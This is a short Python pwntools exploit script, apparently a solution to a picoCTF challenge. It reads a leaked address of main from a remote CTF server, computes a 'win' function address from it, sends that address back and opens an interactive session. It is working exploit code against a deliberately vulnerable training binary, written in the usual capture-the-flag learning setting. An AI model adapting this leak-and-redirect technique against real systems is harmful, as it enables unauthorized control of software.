#!/usr/bin/env python3

# Exploit by x90slide

from pwn import *

elf = ELF("./vuln_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf
#context.log_level = "debug"

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("rescued-float.picoctf.net", 56206)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    main = int(io.recvline()[17:].strip(), 16)
    print(hex(main))

    win = main - 150
    winstr = hex(win)

    payload = flat(winstr + "\n")

    io.sendlineafter(b':', payload)

    io.interactive()

if __name__ == "__main__":
    main()
